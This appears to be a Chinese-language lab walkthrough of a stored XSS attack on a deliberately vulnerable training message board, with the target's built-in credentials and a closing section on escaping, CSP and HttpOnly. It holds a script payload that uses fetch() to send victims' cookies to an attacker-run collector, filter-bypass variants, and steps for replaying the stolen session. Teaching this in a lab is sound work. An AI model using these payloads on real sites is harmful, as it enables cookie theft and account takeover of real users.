XSS + Session Hijacking

留言板把留言內容原封不動輸出到網頁，攻擊者存入的惡意腳本會在每一位瀏覽該留言的使用者端執行，藉此竊取 cookie 並冒用其登入身分。

嚴重度 High   PORT 5001 留言板   PORT 4444 Collector

漏洞原理

留言內容未經編碼即插入 HTML，屬於 Stored XSS：惡意腳本存進資料庫後長期存在，之後每一位看到該留言的使用者，瀏覽器都會執行它。靶機並刻意將 cookie 設為 httponly=False，使 JavaScript 能讀取 document.cookie，這是竊取 cookie 的前提。

兩個網站的角色
留言板 (5001)學員操作的靶站，可註冊、登入、發留言。內建帳號 admin / admin123!、pony / pony
Collector (4444)攻擊者自架的收集伺服器，/steal?cookie=... 會記下任何送入的 cookie，首頁即可看到何時竊得誰的 cookie
攻擊鏈
flow
受害者開啟留言板(5001) → 看到攻擊者存的惡意留言
  → 惡意留言的 JavaScript 在「受害者的瀏覽器」執行
    → 讀取 document.cookie
      → fetch 送往攻擊者的 Collector(4444)
        → 攻擊者在 Collector 首頁看到竊得的 cookie

操作步驟

  1. 確認漏洞存在。在留言板發一則下列留言，重新整理後若跳出彈窗，代表腳本被執行。
    驗證 payload
    <script>alert("XSS")</script>
  2. 竊取 cookie。發出下列留言。網址須換成當天 Collector(4444) 的 trycloudflare 網址，不是 localhost，也不是 5001。
    竊取 cookie payload
    <script>fetch("https://<Collector_4444網址>/steal?cookie=" + document.cookie)</script>
  3. 模擬受害者。以另一組帳號或無痕視窗登入後開啟留言板，再打開 Collector 首頁，確認剛才那位的 cookie 已被收走。
  4. Session Hijacking。把竊得的 session_id 貼進自己瀏覽器的 cookie，重新整理留言板，即以受害者身分登入。此靶機會將偽造的 session 認成對應使用者。
script 被過濾時 若 <script> 被阻擋，可改用事件觸發或大小寫混寫等變形，說明黑名單過濾無法窮舉：<img src=x onerror=alert('XSS')>、<svg onload=alert('XSS')>、<ScRiPt>...</ScRiPt>。

防禦修補

輸出時對使用者內容做 HTML escape，使 <script> 以純文字顯示而非執行；搭配 CSP 限制可載入的腳本來源；cookie 加上 HttpOnly，讓 JavaScript 無法讀取。
